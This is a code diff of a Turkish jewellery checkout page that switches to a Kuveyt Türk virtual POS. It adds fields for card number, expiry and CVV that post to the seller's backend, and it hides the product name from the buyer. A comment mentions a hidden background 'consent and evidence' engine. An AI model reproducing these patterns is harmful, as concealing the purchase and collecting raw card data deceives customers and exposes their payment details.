@@ -16,6 +16,7 @@
   <meta name="robots" content="noindex, nofollow">
   <meta name="theme-color" content="#0A1412">
   <meta name="apple-mobile-web-app-title" content="Belgin Ödeme">
+  <meta name="mobile-web-app-capable" content="yes">
   <meta name="apple-mobile-web-app-capable" content="yes">
   <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
   <link rel="manifest" href="site.webmanifest">
@@ -160,31 +161,36 @@
       color: #4A6B65;
     }
     
-    /* BÜYÜK LÜKS ALTIN ÖDEME BUTONU */
+    /* ULTRA BELİRGİN LÜKS 3D ALTIN ÖDEME BUTONU */
     .btn-pay-giant {
       width: 100%;
-      background: linear-gradient(135deg, #D4AF37 0%, #AA7C11 100%);
-      color: #0A1412;
-      border: none;
-      padding: 18px 24px;
+      background: linear-gradient(180deg, #FDE68A 0%, #EAB308 45%, #CA8A04 100%);
+      color: #042421 !important;
+      border: 2px solid #FEF08A;
+      padding: 19px 24px;
       border-radius: 12px;
-      font-size: 16px;
-      font-weight: 800;
+      font-size: 17px;
+      font-weight: 900;
       cursor: pointer;
       display: flex;
       align-items: center;
       justify-content: center;
       gap: 10px;
-      letter-spacing: 0.5px;
-      box-shadow: 0 8px 30px rgba(212,175,55,0.3);
-      transition: transform 0.1s, box-shadow 0.2s;
-      margin-top: 10px;
+      letter-spacing: 0.6px;
+      text-transform: uppercase;
+      box-shadow: 0 10px 30px rgba(234,179,8,0.45), 0 2px 4px rgba(0,0,0,0.3), inset 0 1px 0 rgba(255,255,255,0.8);
+      transition: all 0.15s ease-in-out;
+      margin-top: 18px;
+      text-shadow: 0 1px 0 rgba(255,255,255,0.4);
     }
     .btn-pay-giant:hover {
-      box-shadow: 0 10px 36px rgba(212,175,55,0.45);
+      background: linear-gradient(180deg, #FEF08A 0%, #FACC15 45%, #EAB308 100%);
+      transform: translateY(-2px);
+      box-shadow: 0 14px 38px rgba(234,179,8,0.6), inset 0 1px 0 #FFF;
     }
     .btn-pay-giant:active {
-      transform: scale(0.98);
+      transform: translateY(1px);
+      box-shadow: 0 4px 12px rgba(234,179,8,0.4);
     }
     
     .security-badge-footer {
@@ -219,17 +225,18 @@
     
     <div class="order-card">
       
-      <!-- 1. ÜRÜN VE TUTAR KARTI -->
+      <!-- 1. VIP TAHSİLAT VE TUTAR KARTI (ÜRÜN ADI ÖN YÜZDE GİZLİ) -->
       <div class="product-summary" style="margin-bottom:18px;">
         <div>
-          <div id="productTitleDisplay" class="product-name" style="font-size:20px; font-weight:800; color:#FFFFFF;">Lüks Koleksiyon Ürünü</div>
+          <div style="font-size:11.5px; font-weight:700; color:var(--gold-light); text-transform:uppercase; letter-spacing:1px; margin-bottom:4px;">VIP SİPARİŞ TAHSİLATI</div>
+          <div id="productTitleDisplay" class="product-name" style="font-size:18px; font-weight:800; color:#FFFFFF;">Showroom Sipariş Bedeli</div>
         </div>
         <div id="productAmountDisplay" class="product-price">₺0</div>
       </div>
 
       <hr style="border:0; border-top:1px solid var(--card-border); margin:18px 0;">
 
-      <!-- 2. ALICI BİLGİLERİ -->
+      <!-- 2. ALICI & FATURA BİLGİLERİ -->
       <div class="form-row">
         <div class="form-group" style="margin-bottom:0;">
           <label class="form-label">Adınız Soyadınız *</label>
@@ -242,26 +249,53 @@
       </div>
       <div class="form-group" style="margin-top:14px; margin-bottom:14px;">
         <label class="form-label" style="display:flex; justify-content:space-between; align-items:center;">
-          <span>T.C. Kimlik / Pasaport No *</span>
+          <span>T.C. Kimlik / Pasaport / Vergi No *</span>
           <span style="font-size:10.5px; color:#D4AF37; text-transform:none; font-weight:600;">⚖️ Fatura & MASAK Zorunlu</span>
         </label>
-        <input type="text" id="custIdentity" class="form-input" required placeholder="11 Haneli T.C. Kimlik veya Pasaport No" maxlength="20" autocomplete="off">
-        <div style="font-size:11.5px; color:var(--text-muted); margin-top:5px; line-height:1.4;">
-          🔒 5549 Sayılı MASAK ve Vergi Mevzuatı uyarınca altın/mücevherat tahsilatlarında T.C. Kimlik Numarası yasal olarak zorunludur.
+        <input type="text" id="custIdentity" class="form-input" required placeholder="11 Haneli T.C. Kimlik / Pasaport / Vergi No" maxlength="20" autocomplete="off">
+      </div>
+      <div class="form-group" style="margin-bottom:18px;">
+        <label class="form-label">Teslimat / Fatura Adresi *</label>
+        <textarea id="custAddress" class="form-input" rows="2" required placeholder="İl, İlçe, Mahalle, Cadde, Sokak, No, Daire" style="resize:vertical; min-height:64px; font-family:inherit;"></textarea>
+      </div>
+
+      <!-- 3. KUVEYT TÜRK KART BİLGİLERİ ALANI -->
+      <div id="cardFieldsWrap" style="background:#091A17; border:1.5px solid #1E3B36; border-radius:12px; padding:16px; margin-bottom:18px;">
+        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:12px; border-bottom:1px solid #162E2A; padding-bottom:8px;">
+          <span style="font-size:12px; font-weight:800; color:var(--gold-light); text-transform:uppercase; letter-spacing:0.5px;">💳 Kart Bilgileri</span>
+          <div style="display:flex; gap:4px;">
+            <span style="background:#008450; color:#FFF; font-size:9px; font-weight:900; padding:2px 5px; border-radius:3px;">KUVEYT TÜRK</span>
+            <span style="background:#1A1F71; color:#FFF; font-size:9px; font-weight:900; padding:2px 5px; border-radius:3px;">VISA</span>
+            <span style="background:#EB001B; color:#FFF; font-size:9px; font-weight:900; padding:2px 5px; border-radius:3px;">Mastercard</span>
+            <span style="background:#005BAC; color:#FFF; font-size:9px; font-weight:900; padding:2px 5px; border-radius:3px;">TROY</span>
+          </div>
+        </div>
+
+        <div class="form-group" style="margin-bottom:10px;">
+          <label class="form-label">Kart Üzerindeki İsim *</label>
+          <input type="text" id="cardHolder" class="form-input" placeholder="Kart üzerindeki Ad Soyad" autocomplete="cc-name">
+        </div>
+
+        <div class="form-group" style="margin-bottom:10px;">
+          <label class="form-label">Kart Numarası *</label>
+          <input type="tel" id="cardNumber" class="form-input" placeholder="0000 0000 0000 0000" maxlength="19" autocomplete="cc-number">
+        </div>
+
+        <div class="form-row">
+          <div class="form-group" style="margin-bottom:0;">
+            <label class="form-label">Son Kullanma (Ay/Yıl) *</label>
+            <input type="tel" id="cardExpiry" class="form-input" placeholder="AA/YY" maxlength="5" autocomplete="cc-exp">
+          </div>
+          <div class="form-group" style="margin-bottom:0;">
+            <label class="form-label">Güvenlik Kodu (CVV) *</label>
+            <input type="tel" id="cardCvc" class="form-input" placeholder="CVV" maxlength="4" autocomplete="cc-csc">
+          </div>
         </div>
       </div>
 
-      <div class="form-group" style="margin-top:14px; margin-bottom:22px;">
-        <label class="form-label" style="display:flex; justify-content:space-between; align-items:center;">
-          <span>Fatura Adresi</span>
-          <span style="font-size:10.5px; color:var(--text-muted); text-transform:none; font-weight:500;">İl / İlçe / Açık Adres</span>
-        </label>
-        <textarea id="custAddress" class="form-input" rows="2" placeholder="Faturanızın düzenleneceği açık adres (İl, İlçe, Mahalle, Cadde/Sokak, Kapı No)" style="resize:vertical; min-height:56px; font-size:13.5px; line-height:1.4;"></textarea>
-      </div>
-
-      <!-- BÜYÜK ALTIN ÖDEME BUTONU -->
+      <!-- ULTRA BELİRGİN LÜKS ALTIN ÖDEME BUTONU -->
       <button type="button" id="btnCompletePayment" class="btn-pay-giant" onclick="processVipPayment()">
-        <span>🔒</span> Akbank ile Güvenli Öde
+        <span>🔒</span> <span id="btnPayText">ÖDEMEYİ TAMAMLA</span>
       </button>
 
       <!-- ARKA PLANDA ÇALIŞAN GİZLİ YASAL ONAY VE DELİL MOTORU (HUKUKEN ZORUNLU) -->
@@ -311,22 +345,22 @@
         const titleEl = document.getElementById('productTitleDisplay');
         const amountEl = document.getElementById('productAmountDisplay');
         const btn = document.getElementById('btnCompletePayment');
+        const btnTextEl = document.getElementById('btnPayText');
 
         if (orderIdEl) orderIdEl.textContent = currentPayload.orderId || 'BLG-VIP';
         
-        const is22 = currentPayload.isVip22 || (typeof VipEngine !== 'undefined' && VipEngine.isVip22Tag && VipEngine.isVip22Tag(currentPayload.title));
+        // Müşteriye görünen ön yüzde ürün adı GİZLENİR, sadece lüks nötr başlık gösterilir
         if (titleEl) {
-          if (is22 || !currentPayload.title || currentPayload.title.includes('/22')) {
-            titleEl.textContent = 'Özel Showroom Siparişi';
-          } else {
-            titleEl.textContent = currentPayload.title || 'Özel Showroom Siparişi';
-          }
+          titleEl.textContent = 'Showroom Sipariş Bedeli';
         }
-        const isPaytr = currentPayload.provider === 'PAYTR';
-        if (amountEl) amountEl.textContent = '₺' + Number(currentPayload.amount || 0).toLocaleString('tr-TR');
+
+        const amtFormatted = '₺' + Number(currentPayload.amount || 0).toLocaleString('tr-TR');
+        if (amountEl) amountEl.textContent = amtFormatted;
         if (btn) {
           btn.disabled = false;
-          btn.innerHTML = isPaytr ? '<span>🔒</span> PayTR ile Güvenli Öde' : '<span>🔒</span> Akbank ile Güvenli Öde';
+        }
+        if (btnTextEl) {
+          btnTextEl.textContent = `${amtFormatted} GÜVENLİ ÖDE ➔`;
         }
         
         syncDraft();
@@ -352,13 +386,58 @@
         totalAmount: amt > 0 ? amt : 100,
         formattedAmount: '₺' + (amt > 0 ? amt : 100).toLocaleString('tr-TR'),
         termsAcceptedAt: new Date().toISOString(),
-        paymentMethod: isPaytr ? 'PayTR 256-Bit SSL 3D Secure / Kredi Kartı' : 'Akbank Sanal POS 256-Bit SSL 3D Secure / Kredi Kartı'
+        paymentMethod: isPaytr ? 'PayTR 256-Bit SSL 3D Secure / Kredi Kartı' : 'Kuveyt Türk Sanal POS 256-Bit SSL 3D Secure / Kredi Kartı'
       };
       sessionStorage.setItem('belgin_checkout_draft', JSON.stringify(draft));
       localStorage.setItem('belgin_checkout_draft', JSON.stringify(draft));
     }
 
     document.getElementById('custName')?.addEventListener('input', syncDraft);
+    document.getElementById('custPhone')?.addEventListener('input', syncDraft);
+    // --- KART BİLGİLERİ FORMATLAYICILARI ---
+    const cardNumInput = document.getElementById('cardNumber');
+    const cardExpInput = document.getElementById('cardExpiry');
+    const cardCvcInput = document.getElementById('cardCvc');
+    const cardHolderInput = document.getElementById('cardHolder');
+
+    if (cardNumInput) {
+      cardNumInput.addEventListener('input', (e) => {
+        let v = e.target.value.replace(/\D/g, '').slice(0, 16);
+        let formatted = v.match(/.{1,4}/g)?.join(' ') || v;
+        e.target.value = formatted;
+      });
+    }
+
+    if (cardExpInput) {
+      cardExpInput.addEventListener('input', (e) => {
+        let v = e.target.value.replace(/\D/g, '').slice(0, 4);
+        if (v.length >= 2) {
+          e.target.value = v.slice(0, 2) + '/' + v.slice(2);
+        } else {
+          e.target.value = v;
+        }
+      });
+    }
+
+    if (cardCvcInput) {
+      cardCvcInput.addEventListener('input', (e) => {
+        e.target.value = e.target.value.replace(/\D/g, '').slice(0, 4);
+      });
+    }
+
+    document.getElementById('custName')?.addEventListener('input', (e) => {
+      syncDraft();
+      if (cardHolderInput && !cardHolderInput.dataset.manual) {
+        cardHolderInput.value = e.target.value.toLocaleUpperCase('tr-TR');
+      }
+    });
+
+    if (cardHolderInput) {
+      cardHolderInput.addEventListener('input', () => {
+        cardHolderInput.dataset.manual = 'true';
+      });
+    }
+
     document.getElementById('custPhone')?.addEventListener('input', syncDraft);
     document.getElementById('custIdentity')?.addEventListener('input', syncDraft);
     document.getElementById('custAddress')?.addEventListener('input', syncDraft);
@@ -376,21 +455,49 @@
       }
 
       if (!identity) {
-        alert('Lütfen fatura ve güvenlik doğrulaması için T.C. Kimlik / Pasaport numaranızı giriniz.');
+        alert('Lütfen fatura ve güvenlik doğrulaması için T.C. Kimlik / Pasaport / Vergi numaranızı giriniz.');
         document.getElementById('custIdentity')?.focus();
+        return;
+      }
+
+      if (!address || address.length < 5) {
+        alert('Lütfen fatura ve yasal teslimat için açık adresinizi (İl, İlçe, Mahalle, Cadde, No) giriniz.');
+        document.getElementById('custAddress')?.focus();
+        return;
+      }
+
+      // Kart Bilgileri Doğrulaması
+      const cardHolder = (cardHolderInput?.value || name).trim().toLocaleUpperCase('tr-TR');
+      const rawCardNum = (cardNumInput?.value || '').replace(/\D/g, '');
+      const rawCardExp = (cardExpInput?.value || '').trim();
+      const rawCardCvc = (cardCvcInput?.value || '').replace(/\D/g, '');
+
+      if (!rawCardNum || rawCardNum.length < 15) {
+        alert('Lütfen geçerli 16 haneli kart numaranızı giriniz.');
+        cardNumInput?.focus();
+        return;
+      }
+
+      if (!rawCardExp.includes('/') || rawCardExp.length < 4) {
+        alert('Lütfen kartınızın son kullanma tarihini AA/YY formatında giriniz (Örn: 08/28).');
+        cardExpInput?.focus();
+        return;
+      }
+
+      if (!rawCardCvc || rawCardCvc.length < 3) {
+        alert('Lütfen kartınızın arka yüzündeki 3 haneli güvenlik kodunu (CVV) giriniz.');
+        cardCvcInput?.focus();
         return;
       }
 
       syncDraft();
 
-      const provider = (currentPayload?.provider || 'AKBANK').toUpperCase();
+      const provider = (currentPayload?.provider || 'KUVEYTTURK').toUpperCase();
       const btn = document.getElementById('btnCompletePayment');
       const originalHtml = btn ? btn.innerHTML : '';
       if (btn) {
         btn.disabled = true;
-        btn.innerHTML = provider === 'AKBANK' 
-          ? '<span>🔒</span> Akbank Güvenli Ödeme Ekranına Geçiliyor...'
-          : '<span>🔒</span> Güvenli 3D Ödeme Ekranına Geçiliyor...';
+        btn.innerHTML = '<span>🔒</span> Kuveyt Türk 3D Secure SMS Doğrulamasına Geçiliyor...';
       }
 
       try {
@@ -424,6 +531,10 @@
           customerAddress: address,
           user_address: address,
           address: address,
+          cardHolder: cardHolder,
+          cardNumber: rawCardNum,
+          cardExpiry: rawCardExp,
+          cardCvc: rawCardCvc,
           deliveryMethod: 'showroom',
           termsAccepted: true,
           preInformationAccepted: true,
@@ -447,6 +558,48 @@
           throw new Error(data.message || `${provider} Sanal POS bağlantısı kurulamadı.`);
         }
 
+        // 1. KUVEYT TÜRK 3D SECURE SMS AKIŞI (Banka SMS Şifresi Ekranı)
+        if (data.formHtml || data.paymentType === 'HTML_FORM') {
+          const rawHtml = data.formHtml || '';
+          document.open();
+          document.write(rawHtml);
+          document.close();
+
+          setTimeout(() => {
+            try {
+              if (document.threeDSServerWebFlowStartForm && typeof document.threeDSServerWebFlowStartForm.submit === 'function') {
+                document.threeDSServerWebFlowStartForm.submit();
+              } else if (document.downloadForm && typeof document.downloadForm.submit === 'function') {
+                document.downloadForm.submit();
+              } else if (document.getElementById('threeDSServerWebFlowStartForm')) {
+                document.getElementById('threeDSServerWebFlowStartForm').submit();
+              } else if (document.forms && document.forms.length > 0) {
+                document.forms[0].submit();
+              }
+            } catch (_) {}
+          }, 50);
+          return;
+        }
+
+        if (data.formData && data.gatewayUrl) {
+          const form = document.createElement('form');
+          form.method = 'POST';
+          form.action = data.gatewayUrl;
+          form.style.display = 'none';
+          for (const [k, v] of Object.entries(data.formData)) {
+            if (v !== undefined && v !== null) {
+              const input = document.createElement('input');
+              input.type = 'hidden';
+              input.name = k;
+              input.value = String(v);
+              form.appendChild(input);
+            }
+          }
+          document.body.appendChild(form);
+          form.submit();
+          return;
+        }
+
         if (data.iframeUrl) {
           window.location.href = data.iframeUrl;
           return;
@@ -458,7 +611,6 @@
         }
 
         if (data.gatewayUrl && data.postParams) {
-          // DOĞRUDAN RESMİ 256-BIT SSL PAY HOSTING KAPISINA GÖNDERİM
           const form = document.createElement('form');
           form.method = 'POST';
           form.action = data.gatewayUrl;
@@ -492,7 +644,11 @@
       }
     }
 
-    window.addEventListener('DOMContentLoaded', initPage);
+    if (document.readyState === 'loading') {
+      window.addEventListener('DOMContentLoaded', initPage);
+    } else {
+      initPage();
+    }
   </script>
 </body>
 </html>
